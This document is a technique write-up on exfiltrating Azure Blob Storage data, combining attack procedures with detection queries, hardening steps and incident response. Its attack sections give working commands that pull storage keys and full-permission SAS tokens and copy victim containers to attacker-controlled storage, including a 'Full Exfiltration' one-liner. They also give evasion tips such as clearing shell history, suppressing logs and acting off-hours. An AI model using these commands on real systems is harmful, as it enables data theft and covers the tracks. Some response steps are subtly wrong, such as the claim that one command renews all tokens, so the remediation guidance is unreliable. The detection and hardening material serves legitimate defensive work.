# [COLLECT-DATA-001]: Azure Blob Storage Data Exfiltration

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-DATA-001 |
| **MITRE ATT&CK v18.1** | [Transfer Data to Cloud Account (T1537)](https://attack.mitre.org/techniques/T1537/) |
| **Tactic** | Collection, Exfiltration |
| **Platforms** | Entra ID (Azure) |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Azure subscription versions, AzCopy 10.0+, Azure Storage Explorer 1.0+ |
| **Patched In** | N/A - No patch available; depends on RBAC enforcement |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

- **Concept:** Azure Blob Storage data exfiltration involves transferring data from victim-owned blob containers to an attacker-controlled cloud storage account. An attacker with compromised credentials or SAS tokens can leverage Azure-native tools (AzCopy, Azure Storage Explorer) or REST APIs to bulk-download sensitive data while blending traffic with legitimate cloud provider operations. This technique bypasses traditional network-based data transfer detection by utilizing Azure's internal addressing and trusted domains.

- **Attack Surface:** Azure Storage Account keys, SAS tokens, Managed Identity credentials, or Entra ID user accounts with Storage Blob Data Reader/Contributor roles.

- **Business Impact:** **Complete data breach of cloud-stored assets.** Attackers can access unencrypted or poorly encrypted data including documents, backups, application data, and configuration secrets stored in blob containers.

- **Technical Context:** Data transfer via AzCopy can achieve multi-gigabit throughput, enabling exfiltration of terabytes of data in minutes. Detection is challenging because the traffic leverages trusted Azure infrastructure.

### Operational Risk

- **Execution Risk:** Low to Medium (if credentials are already compromised; High if MFA/Conditional Access is enforced)
- **Stealth:** Medium (large data transfers may trigger anomaly detection, but can be obfuscated with SAS tokens or inside-cloud transfers)
- **Reversibility:** No – exfiltrated data cannot be recovered without incident response intervention

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1.3 | Ensure that Storage blobs restrict public access |
| **DISA STIG** | SV-256508 | Configure Azure Storage Account firewall rules |
| **NIST 800-53** | AC-3, SC-7 | Access Control Enforcement, Boundary Protection |
| **GDPR** | Art. 32 | Security of Processing – Encryption, access logs |
| **DORA** | Art. 9 | Protection and Prevention of Attacks |
| **NIS2** | Art. 21 | Cyber Risk Management Measures |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **ISO 27005** | Scenario: "Data breach via compromised cloud credentials" | Data classification and access control failures |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Storage Blob Data Reader, Storage Blob Data Contributor, or account ownership rights on source blob container
- **Required Access:** Network connectivity to Azure Storage Account endpoints (blob.core.windows.net)

**Supported Versions:**
- **Azure:** All subscription types (Free, Pay-as-you-go, Enterprise)
- **AzCopy:** Version 10.0+ (current version 10.21+)
- **Azure Storage Explorer:** Version 1.10+
- **PowerShell:** Az.Storage module 4.0+
- **Other Requirements:** Valid credentials (account key, SAS token, or Entra ID MFA bypass if applicable)

**Tools:**
- [AzCopy](https://learn.microsoft.com/en-us/azure/storage/common/storage-use-azcopy-v10) (Version 10.21+)
- [Azure Storage Explorer](https://azure.microsoft.com/en-us/products/storage/storage-explorer/) (Version 1.30+)
- [Microsoft Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (az-cli 2.50+)
- [Jaeger](https://github.com/getutility/jaeger) (Azure data exfiltration tool)
- [MicroBurst](https://github.com/NetSPI/MicroBurst) (Azure enumeration and exfiltration)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Azure CLI Reconnaissance

```bash
# Enumerate storage accounts in subscription
az storage account list --output table

# List containers in a storage account
az storage container list --account-name <storage_account_name>

# Check if public access is enabled (anonymous access)
az storage container show-permission --name <container_name> --account-name <storage_account_name>

# List blobs in a container with size information
az storage blob list --account-name <storage_account_name> --container-name <container_name> --output table --query "[].{Name:name, Size:properties.contentLength, Modified:properties.lastModified}"

# Enumerate storage account firewall rules
az storage account show --name <storage_account_name> --query "networkAcls"
```

**What to Look For:**
- Storage accounts with **public access** (`"enabled": true`)
- **Containers with anonymous access** (`"publicAccess": "Blob"` or `"Container"`)
- **Missing firewall rules** (defaultAction = "Allow")
- **High-volume blobs** (GBs or TBs of data)
- **Outdated backup files** or **unencrypted credentials**

### PowerShell Reconnaissance

```powershell
# Get storage account context
$storageContext = New-AzStorageContext -StorageAccountName "myaccount" -StorageAccountKey "<key>"

# List all containers
Get-AzStorageContainer -Context $storageContext | Select-Object Name

# Get container properties
Get-AzStorageContainerStoredAccessPolicy -Container "mycontainer" -Context $storageContext

# Check container access level
Get-AzStorageContainer -Name "mycontainer" -Context $storageContext | Select-Object PublicAccess
```

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Using AzCopy with Storage Account Key

**Supported Versions:** All Azure subscription types

#### Step 1: Obtain Storage Account Key or SAS Token

**Objective:** Acquire authentication credentials for the source storage account

**Command:**

```bash
# List storage account keys (requires account owner or Storage Account Key Operator role)
az storage account keys list --account-name <source_storage_account> --resource-group <rg>

# Generate SAS token (7-day expiration)
az storage account generate-sas --account-name <source_storage_account> --account-key <storage_key> --permissions racwd --resource-types sco --services b --expiry 2026-01-17
```

**Expected Output:**

```
[
  {
    "keyName": "key1",
    "value": "DefaultEndpointsProtocol=https;AccountName=...",
    "permissions": "Full"
  }
]
```

**What This Means:**
- `keyName` = Primary or Secondary key identifier
- `value` = Full connection string or key
- `permissions` = Access level (Full = read/write)

**OpSec & Evasion:**
- Use SAS tokens with time-limited expiration instead of account keys
- Execute during off-hours to avoid detection
- Use UPN alias or shared account to obscure attribution
- Detection likelihood: **Medium-High** (if monitoring account key operations or SAS token generation)

#### Step 2: Download Data via AzCopy

**Objective:** Transfer blob data to attacker-controlled storage or local disk

**Command (Download to Local Disk):**

```bash
# Download single blob
azcopy copy 'https://<source_storage>.blob.core.windows.net/<container>/<blob_name>' 'C:\Local\Path\<blob_name>'

# Download entire container recursively
azcopy copy 'https://<source_storage>.blob.core.windows.net/<container>' 'C:\Local\Path' --recursive

# Download with specific file pattern
azcopy copy 'https://<source_storage>.blob.core.windows.net/<container>/*.txt' 'C:\Local\Path' --recursive

# Download with SAS token (no key storage)
azcopy copy 'https://<source_storage>.blob.core.windows.net/<container>?<SAS_token>' 'C:\Local\Path' --recursive
```

**Command (Transfer to Attacker's Cloud Storage):**

```bash
# Login to AzCopy with attacker tenant
azcopy login --tenant-id <attacker_tenant_id>

# Sync from victim to attacker storage
azcopy sync 'https://<victim_storage>.blob.core.windows.net/<container>' 'https://<attacker_storage>.blob.core.windows.net/<container>' --recursive

# Copy with progress monitoring
azcopy copy 'https://<victim_storage>.blob.core.windows.net/<container>/*' 'https://<attacker_storage>.blob.core.windows.net/<container>/' --recursive --log-level=INFO
```

**Expected Output:**

```
[2026-01-10T15:30:45.123Z] INFO: Job 12345abc started
[2026-01-10T15:30:46.456Z] INFO: Transferring files...
Final Job Status: Completed
Total files transferred: 1,250
Total bytes transferred: 125.5 GB
Duration: 45m30s
```

**What This Means:**
- Transfer initiated and queued successfully
- File count and byte size indicate data volume exfiltrated
- Duration helps identify anomalous large transfers for detection tuning

**OpSec & Evasion:**
- Compress data before transfer to reduce bandwidth signature
- Split transfers into multiple smaller operations to evade volumetric thresholds
- Use `--log-level=ERROR` to suppress verbose logging
- Clear shell history: `Remove-Item (Get-PSReadlineOption).HistorySavePath`
- Delete local copies after upload: `Remove-Item 'C:\Local\Path' -Recurse -Force`
- Detection likelihood: **High** (StorageRead logs, large data transfers trigger anomaly alerts)

**Troubleshooting:**

- **Error:** "Authentication failed" / "AuthenticationFailed"
  - **Cause:** Expired SAS token or invalid storage account key
  - **Fix:** Regenerate SAS token or retrieve current storage account key from Azure Portal

- **Error:** "Access denied" / "AuthorizationFailed"
  - **Cause:** RBAC role lacks Storage Blob Data Reader permissions
  - **Fix:** Ensure compromised user/MSI has `Storage Blob Data Reader` or `Storage Blob Data Owner` role assigned

- **Error:** "Firewall rule blocked the request"
  - **Cause:** Storage account has firewall rules restricting access
  - **Fix:** Use service endpoints from within allowed VNets or disable firewall temporarily (if privileged)

**References & Proofs:**
- [AzCopy v10 Documentation](https://learn.microsoft.com/en-us/azure/storage/common/storage-use-azcopy-v10)
- [AzCopy Login with Entra ID](https://learn.microsoft.com/en-us/azure/storage/common/storage-use-azcopy-authorize-azure-active-directory)
- [Real-World Example: NTDS.DIT Exfiltration via AzCopy](https://m365internals.com/2021/06/11/exfiltrating-data-by-transfering-it-to-the-cloud-with-azcopy/)

---

### METHOD 2: Using Azure Storage Explorer GUI

**Supported Versions:** Azure Storage Explorer 1.10+

#### Step 1: Connect to Storage Account

**Objective:** Authenticate to the source storage account via GUI

**Manual Steps:**

1. Launch **Azure Storage Explorer**
2. Click **+ Add Account**
3. Select **Storage Account or Service** → **Account name and key**
4. Enter Storage Account Name and Account Key
5. Click **Connect**

**Alternative (SAS Token):**

1. Click **+ Add Account**
2. Select **Shared Access Signature (SAS) URL**
3. Paste SAS token URL: `https://<storage_account>.blob.core.windows.net/?<SAS_token>`
4. Click **Connect**

**Expected Output:**

```
✓ Connected successfully
- Container1
  - blob1.txt (50 MB)
  - blob2.docx (120 MB)
- Container2
  - data.tar.gz (2.3 GB)
```

#### Step 2: Download via GUI

**Objective:** Download blobs to local attacker machine

**Manual Steps:**

1. Navigate to target container
2. Right-click blob → **Download**
3. Select save location (e.g., `C:\Temp`)
4. Monitor transfer in **Download Manager**

**Batch Download:**

1. Select multiple blobs (Ctrl+Click)
2. Right-click → **Download**
3. All files download to same location

**OpSec & Evasion:**
- Use non-standard download locations (e.g., `C:\ProgramData\Microsoft\Windows\` to blend with system files)
- Disable notifications during transfer
- Clear **Recent Files** after completion
- Detection likelihood: **High** (if Storage Account diagnostics enabled)

---

### METHOD 3: Using Azure CLI (Programmatic Export)

**Supported Versions:** Azure CLI 2.50+

#### Step 1: Enumerate All Accessible Blobs

**Objective:** Discover sensitive data before exfiltration

**Command:**

```bash
# List all containers
az storage container list --account-name <storage_account> --account-key <key> --query "[].name" --output table

# List blobs with metadata
az storage blob list --account-name <storage_account> --container-name <container> --account-key <key> --query "[].{Name:name, Size:properties.contentLength, Type:properties.contentType}" --output table

# Find large blobs (> 100 MB)
az storage blob list --account-name <storage_account> --container-name <container> --account-key <key> --query "[?properties.contentLength > `100000000`].{Name:name, Size_MB:properties.contentLength/1000000}" --output table
```

#### Step 2: Bulk Download

**Command:**

```bash
# Download all blobs from container
for blob in $(az storage blob list --account-name <storage_account> --container-name <container> --account-key <key> --query "[].name" -o tsv)
do
  az storage blob download --account-name <storage_account> --container-name <container> --name "$blob" --file "C:\Downloads\$blob" --account-key <key>
done

# Parallel download using xargs (Linux)
az storage blob list --account-name <storage_account> --container-name <container> --account-key <key> --query "[].name" -o tsv | \
xargs -P 10 -I {} az storage blob download --account-name <storage_account> --container-name <container> --name {} --file "/tmp/{}" --account-key <key>
```

---

### METHOD 4: REST API Direct Transfer (Programmatic)

**Supported Versions:** All Azure API versions

#### Step 1: Generate SAS Token with Full Permissions

**Objective:** Create time-limited, permission-scoped token for REST operations

**Command (PowerShell):**

```powershell
$containerName = "sensitive-data"
$storageContext = New-AzStorageContext -StorageAccountName "victimaccount" -StorageAccountKey "<key>"

# Generate SAS token with 7-day expiration, full permissions
$token = New-AzStorageContainerSASToken -Name $containerName -Context $storageContext -Permission racwd -ExpiryTime (Get-Date).AddDays(7)

Write-Host "https://victimaccount.blob.core.windows.net/$containerName$token"
```

#### Step 2: Download via cURL/Wget (REST API)

**Command:**

```bash
# List blobs via REST
curl -s 'https://<storage>.blob.core.windows.net/<container>?restype=container&comp=list&<SAS_token>' | grep -oP '(?<=<Name>)[^<]*' > blob_list.txt

# Download each blob
while read blob; do
  curl -s 'https://<storage>.blob.core.windows.net/<container>/$blob?<SAS_token>' -o "$blob"
done < blob_list.txt

# Or using wget with parallel downloads
cat blob_list.txt | xargs -P 5 -I {} wget 'https://<storage>.blob.core.windows.net/<container>/{}?<SAS_token>' -O '/tmp/{}'
```

---

## 6. TOOLS & COMMANDS REFERENCE

### AzCopy v10

**Version:** 10.21 (Current)
**Minimum Version:** 10.0
**Supported Platforms:** Windows, Linux, macOS

**Installation:**

```bash
# Windows (PowerShell)
Invoke-WebRequest -Uri "https://aka.ms/downloadazcopy-v10-windows" -OutFile "azcopy.zip"
Expand-Archive -Path "azcopy.zip" -DestinationPath "C:\Program Files"
# Add to PATH

# Linux
wget https://aka.ms/downloadazcopy-v10-linux -O azcopy.tar.gz
tar -xzf azcopy.tar.gz
sudo cp azcopy /usr/local/bin/

# macOS
curl https://aka.ms/downloadazcopy-v10-mac -o azcopy.zip
unzip azcopy.zip
sudo mv azcopy /usr/local/bin/
```

**One-Liner (Full Exfiltration):**

```bash
azcopy copy 'https://<victim>.blob.core.windows.net/<container>/*?<SAS>' 'https://<attacker>.blob.core.windows.net/<container>/' --recursive --log-level=ERROR
```

---

## 7. SPLUNK DETECTION RULES

#### Rule 1: Bulk Blob Download Activity

**Rule Configuration:**
- **Required Index:** azure_activity, azure_storage
- **Required Sourcetype:** azure:aad:audit, azure:storage:blob
- **Required Fields:** properties.operationName, properties.callerIpAddress, properties.resourceProvider
- **Alert Threshold:** > 10 GB downloaded in 10 minutes
- **Applies To Versions:** All Azure subscription types

**SPL Query:**

```
sourcetype="azure:storage:blob" category="StorageRead" 
| stats sum(bytes_received) as total_bytes by user, src_ip, container_name 
| where total_bytes > 10737418240
| eval total_gb = round(total_bytes/1024/1024/1024, 2)
| table user, src_ip, container_name, total_gb
```

**What This Detects:**
- Large-volume blob downloads exceeding 10 GB threshold
- Identifies user, source IP, and affected containers
- Helps identify mass exfiltration attempts

**Manual Configuration Steps:**

1. Log into **Splunk Web** → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste SPL query above
5. Set **Trigger Condition** to `> 0 results`
6. Configure **Action** → Send email to SOC team

---

#### Rule 2: AzCopy or Azure Storage Explorer Usage

**SPL Query:**

```
sourcetype="azure:storage:blob" (user_agent="AzCopy" OR user_agent="Azure Storage Explorer" OR user_agent="Microsoft.Azure*")
| stats count by user_agent, requester_upn, operation 
| where count > 5
```

**False Positive Analysis:**
- **Legitimate Activity:** Azure DevOps pipelines, backup jobs, data migration tools
- **Benign Tools:** Azure Backup service, Azure Data Factory
- **Tuning:** Exclude service accounts: `| where requester_upn!="svc_*" AND requester_upn!="backup@*"`

---

## 8. MICROSOFT SENTINEL DETECTION

#### Query 1: Anomalous Blob Storage Data Extraction

**Rule Configuration:**
- **Required Table:** StorageBlobLogs, AuditLogs
- **Required Fields:** OperationName, RequesterUpn, BytesReceived, StatusCode
- **Alert Severity:** High
- **Frequency:** Every 10 minutes
- **Applies To Versions:** All Azure subscription types

**KQL Query:**

```kusto
StorageBlobLogs
| where OperationName == "GetBlob" or OperationName == "ListBlobs"
| where StatusCode == "200"
| summarize TotalBytesReceived = sum(BytesReceived), OperationCount = count() by RequesterUpn, ClientIp, bin(TimeGenerated, 10m)
| where TotalBytesReceived > 1099511627776  // > 1 TB in 10 minutes
| join kind=inner (
    AuditLogs
    | where OperationName == "Get storage account key"
    | project RequesterUpn, TimeGenerated
) on RequesterUpn
```

**What This Detects:**
- Large-volume blob downloads (> 1 TB in 10 minutes)
- Correlates with recent storage key retrieval operations
- Identifies potential credential compromise followed by exfiltration

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Anomalous Blob Storage Exfiltration`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `10 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Grouping by: `RequesterUpn, ClientIp`
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**

```powershell
# Connect to Sentinel
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

# Create the analytics rule
New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Anomalous Blob Storage Exfiltration" `
  -Query @"
StorageBlobLogs
| where OperationName == "GetBlob" or OperationName == "ListBlobs"
| where StatusCode == "200"
| summarize TotalBytesReceived = sum(BytesReceived), OperationCount = count() by RequesterUpn, ClientIp, bin(TimeGenerated, 10m)
| where TotalBytesReceived > 1099511627776
"@ `
  -Severity "High" `
  -Enabled $true
```

**Source:** [Microsoft Sentinel Detection Best Practices - Storage Monitoring](https://learn.microsoft.com/en-us/azure/storage/common/storage-analytics)

---

#### Query 2: Suspicious SAS Token Generation & Usage

**KQL Query:**

```kusto
AuditLogs
| where OperationName == "Generate storage account SAS token" or OperationName == "List Storage Account Keys"
| where InitiatedBy.user.id != "00000000-0000-0000-0000-000000000001"  // Exclude service principals
| join kind=inner (
    StorageBlobLogs
    | where TimeGenerated > ago(1h)
    | where OperationName == "GetBlob"
    | summarize BytesByRequester = sum(BytesReceived) by RequesterObjectId
) on $left.InitiatedBy.user.id == $right.RequesterObjectId
| where BytesByRequester > 536870912  // > 512 MB downloaded
```

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4663 (An attempt was made to access an object)**
- **Log Source:** Security
- **Trigger:** File access events (blobs downloaded to local disk cache)
- **Filter:** `Object Type == "File"` AND `Object Name` matches `C:\Users\*\AppData\Local\Temp\*`
- **Applies To Versions:** Windows Server 2016-2025

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Object Access** → **Audit File System**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines

**Manual Configuration Steps (Local Policy - Windows 10/11):**

1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Object Access**
3. Enable: **Audit File System**
4. Set to: **Success and Failure**
5. Apply SACL to monitored directories:
   ```powershell
   $acl = Get-Acl "C:\Users\*\AppData\Local\Temp"
   $rule = New-Object System.Security.AccessControl.FileSystemAuditRule("Everyone", "Read", "Success")
   $acl.AddAuditRule($rule)
   Set-Acl "C:\Users\*\AppData\Local\Temp" $acl
   ```

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows

```xml
<Sysmon schemaversion="4.81">
  <!-- Detect AzCopy process execution -->
  <RuleGroup name="" groupRelation="or">
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">azcopy</CommandLine>
      <CommandLine condition="contains">azcopy copy</CommandLine>
      <CommandLine condition="contains">azcopy sync</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- Detect Azure Storage Explorer execution -->
  <RuleGroup name="" groupRelation="or">
    <ProcessCreate onmatch="include">
      <Image condition="contains">StorageExplorer.exe</Image>
    </ProcessCreate>
  </RuleGroup>

  <!-- Monitor network connections to Azure Blob Storage -->
  <RuleGroup name="" groupRelation="or">
    <NetworkConnect onmatch="include">
      <DestinationHostname condition="contains">blob.core.windows.net</DestinationHostname>
      <DestinationHostname condition="contains">blob.core.chinacloudapi.cn</DestinationHostname>
      <DestinationPort condition="is">443</DestinationPort>
    </NetworkConnect>
  </RuleGroup>
</Sysmon>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file `sysmon-config.xml` with XML above
3. Install Sysmon:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10 | Select-Object Message
   ```

---

## 11. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Unusual data transfer volume detected from Azure Storage Account"
- **Severity:** High
- **Description:** Triggers when data transfer from blob storage exceeds baseline by 300% or > 50 GB in 1 hour
- **Applies To:** All subscriptions with Defender enabled
- **Remediation:**
  1. Isolate affected storage account (disable public access, remove SAS tokens)
  2. Review access logs in **Storage Account** → **Monitoring** → **Logs**
  3. Rotate storage account keys immediately
  4. Investigate source IP and user for credential compromise

**Manual Configuration Steps (Enable Defender for Cloud):**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Storage**: ON
   - **Enable data sensitivity discovery**: ON
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

---

## 12. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: StorageObjectAccessedByExternalUser

```powershell
Search-UnifiedAuditLog -Operations StorageObjectAccessedByExternalUser -StartDate (Get-Date).AddDays(-7) -FreeText "blob"

# Export to CSV for analysis
Search-UnifiedAuditLog -Operations StorageObjectAccessedByExternalUser -StartDate (Get-Date).AddDays(-7) | Export-Csv -Path "C:\Logs\blob_access.csv"
```

- **Operation:** StorageObjectAccessedByExternalUser, StorageObjectListedByExternalUser
- **Workload:** Microsoft.Azure
- **Details:** Check `AuditData.Properties.CallerIpAddress`, `RequestProperties.SourceObjectPath`
- **Applies To:** M365 E5, Defender for Cloud Plans

**Manual Configuration Steps (Enable Unified Audit Log):**

1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** → **New Search**
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for initial data availability

**Manual Configuration Steps (Search Audit Logs):**

1. Go to **Audit** → **Search**
2. Set **Date range:** Last 7 days
3. Under **Activities**, select: **StorageObjectAccessedByExternalUser**
4. Click **Search**
5. Export results: **Export** → **Download all results** (CSV format)

---

## 13. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Enable Storage Account Firewall & Virtual Network Restrictions**

**Objective:** Prevent unauthorized access to blob storage from non-sanctioned networks

**Applies To Versions:** All Azure subscription types

**Manual Steps (Azure Portal):**

1. Go to **Azure Portal** → **Storage Accounts** → **[Account Name]**
2. Click **Networking** (left sidebar)
3. Under **Firewall and virtual networks**, select **Selected networks**
4. Add trusted **Virtual networks** (if using service endpoints)
5. Add trusted **IP addresses** (corporate gateways only)
6. Set **Allow Azure services on the trusted services list to access this storage account**: **ON**
7. Click **Save**

**Manual Steps (PowerShell):**

```powershell
# Update storage account firewall
Update-AzStorageAccountNetworkRuleSet -ResourceGroupName "rg-name" `
  -Name "storage-account" `
  -DefaultAction Deny `
  -Bypass AzureServices

# Add allowed VNet
Add-AzStorageAccountNetworkRule -ResourceGroupName "rg-name" `
  -Name "storage-account" `
  -VirtualNetworkResourceId "/subscriptions/.../subnets/allowed-subnet"

# Add allowed IP
Add-AzStorageAccountNetworkRule -ResourceGroupName "rg-name" `
  -Name "storage-account" `
  -IPAddressOrRange "203.0.113.0/24"
```

**Validation Command:**

```powershell
Get-AzStorageAccountNetworkRuleSet -ResourceGroupName "rg-name" -Name "storage-account" | Select-Object DefaultAction, Bypass
```

**Expected Output (If Secure):**

```
DefaultAction Bypass
------------- ------
         Deny AzureServices
```

---

**Disable Shared Key Access (Force Entra ID Only)**

**Objective:** Eliminate account key theft vector

**Manual Steps (Azure Portal):**

1. Go to **Storage Account** → **Access Control** → **Shared access keys**
2. Click **Disable**
3. Confirm: **Disable shared key access**

**Manual Steps (PowerShell):**

```powershell
Set-AzStorageAccount -ResourceGroupName "rg-name" `
  -Name "storage-account" `
  -AllowSharedKeyAccess $false
```

---

**Require Managed Identity for All Access**

**Objective:** Enforce identity-based access control (RBAC)

**Manual Steps (Azure Portal):**

1. Navigate to **Storage Account** → **Access Control (IAM)**
2. Click **+ Add** → **Add role assignment**
3. Under **Role**, select: **Storage Blob Data Reader** or **Storage Blob Data Contributor**
4. Under **Members**, select: **Managed Identity** or **User**
5. Choose target managed identity/user
6. Click **Review + assign**

**Manual Steps (PowerShell):**

```powershell
# Assign Storage Blob Data Reader to managed identity
New-AzRoleAssignment -ObjectId "<managed-identity-id>" `
  -RoleDefinitionName "Storage Blob Data Reader" `
  -Scope "/subscriptions/<sub-id>/resourceGroups/<rg>/providers/Microsoft.Storage/storageAccounts/<account-name>"
```

---

### Priority 2: HIGH

**Enable Audit Logging & Monitoring**

**Manual Steps:**

1. **Storage Account** → **Monitoring** → **Diagnostic settings**
2. Click **+ Add diagnostic setting**
3. Enable logs: **StorageRead**, **StorageWrite**, **StorageDelete**
4. Send to: **Log Analytics Workspace** or **Azure Event Hubs**
5. Click **Save**

**Monitor for Suspicious Patterns:**

```powershell
# Query recent blob read operations (suspicious activity)
$logs = Search-UnifiedAuditLog -Operations StorageObjectAccessedByUser -StartDate (Get-Date).AddHours(-2)
$logs | Where-Object { $_.ResultIndex -gt 100 } | Select-Object -Property UserIds, ClientIpAddress, AuditData
```

---

**Access Control & Policy Hardening**

**Conditional Access Policy (Block Anomalous Access):**

1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Name: `Block Blob Storage from Untrusted Locations`
4. **Assignments:**
   - Users: **All users**
   - Cloud apps: **Azure Storage**
5. **Conditions:**
   - Locations: **Exclude** trusted corporate locations
6. **Access controls:**
   - Grant: **Block access**
7. Enable policy: **On**
8. Click **Create**

**RBAC/ABAC:**

- Remove **Storage Account Key Operator** and **Storage Account Owner** roles from users
- Limit **Storage Blob Data Contributor** to minimum required accounts
- Use **Privileged Identity Management (PIM)** for just-in-time access to blob management roles

---

**Validation Command (Verify Fix):**

```powershell
# Verify firewall is enabled
$storageAccount = Get-AzStorageAccount -ResourceGroupName "rg-name" -Name "storage-account"
$storageAccount.NetworkRuleSet.DefaultAction

# Verify shared key access is disabled
$storageAccount.AllowSharedKeyAccess
```

**Expected Output (If Secure):**

```
DefaultAction: Deny
AllowSharedKeyAccess: False
SharedKeyAccessEnabled: False
```

---

## 14. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Process Names:**
- `azcopy.exe`
- `azcopy` (Linux/macOS)
- `StorageExplorer.exe`

**Network:**
- Connections to `*.blob.core.windows.net` on port 443
- Connections to `*.blob.core.chinacloudapi.cn` (China Azure)
- Large data volumes to external IPs followed by Azure storage access

**Registry (Windows):**
- `HKCU\Software\Microsoft\Azure Storage Explorer\`
- Recent Azure CLI authentication tokens in: `C:\Users\<user>\.azure\`

**Cloud Logs:**
- `StorageBlobLogs.OperationName == "GetBlob"` with high `BytesReceived`
- `AuditLogs.OperationName == "Generate storage account SAS token"`
- `AuditLogs.OperationName == "List Storage Account Keys"`

### Forensic Artifacts

**Disk:**
- AzCopy command history: `C:\Users\<user>\AppData\Local\Microsoft\Windows\PowerShell_transcript*`
- Downloaded blob cache: `C:\Users\<user>\AppData\Local\Temp\` (may contain extracted files)
- Browser history (Storage Explorer UI): `C:\Users\<user>\AppData\Roaming\Microsoft\StorageExplorer\`

**Memory:**
- AzCopy process memory contains transfer URLs and credentials
- Azure Storage Explorer process contains authentication tokens

**Cloud:**
- Azure Activity Log: `Microsoft.Storage/storageAccounts/listKeys/action`
- Storage Blob Logs: `StorageBlobLogs` table with `GetBlob` operations and `BytesReceived`
- Sentinel incidents: Anomalous blob downloads, unusual user agents (AzCopy, Storage Explorer)

### Response Procedures

**1. Immediate Containment (0-5 minutes):**

**Command:**

```powershell
# Disable storage account access
Set-AzStorageAccount -ResourceGroupName "rg-name" -Name "storage-account" -AllowSharedKeyAccess $false

# Revoke all SAS tokens
Get-AzStorageAccountKey -ResourceGroupName "rg-name" -Name "storage-account" | New-AzStorageAccountKey -KeyName key1
```

**Manual (Azure Portal):**
- Go to **Storage Account** → **Access Control**
- Remove all **Storage Account Key Operator** role assignments
- Disable **Shared Key Access**

**2. Investigation (5-30 minutes):**

**Command:**

```powershell
# Export audit logs for analysis
$logs = Search-UnifiedAuditLog -Operations StorageObjectAccessedByUser -StartDate (Get-Date).AddHours(-24)
$logs | Export-Csv -Path "C:\Incident\blob_access_24h.csv" -NoTypeInformation

# List all blobs that were accessed
$context = New-AzStorageContext -StorageAccountName "storage-account" -StorageAccountKey "<key>"
Get-AzStorageBlob -Container "container-name" -Context $context | Where-Object { $_.LastModified -gt (Get-Date).AddHours(-24) }
```

**Manual (Azure Portal):**
1. Go to **Storage Account** → **Monitoring** → **Logs**
2. Run KQL query: `StorageBlobLogs | where OperationName == "GetBlob" | where TimeGenerated > ago(24h) | summarize count() by RequesterUpn`
3. Export results to CSV

**3. Remediation (30-60 minutes):**

**Command:**

```powershell
# Rotate all storage account keys
Get-AzStorageAccountKey -ResourceGroupName "rg-name" -Name "storage-account" | New-AzStorageAccountKey -KeyName key1 -Force

# Delete suspicious SAS tokens (revoke all active tokens)
$storageAccount = Get-AzStorageAccount -ResourceGroupName "rg-name" -Name "storage-account"
$storageAccount | Update-AzStorageAccount  # Forces renewal of all tokens

# Restore blob versions (if versioning enabled)
Get-AzStorageBlob -Container "container-name" -Context $context | Where-Object { $_.IsLatestVersion -eq $false } | Restore-AzStorageBlob
```

**Manual:**
1. Download affected blobs to secure location for forensic analysis
2. If ransomware suspected, restore from backup prior to breach date
3. Enable **Storage Account Encryption** with **Customer-Managed Keys** (CMK) in Azure Key Vault

---

## 15. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker phishes user credentials or MFA token |
| **2** | **Credential Access** | [CA-TOKEN-001] Hybrid AD Cloud Token Theft | Attacker steals access token from compromised device |
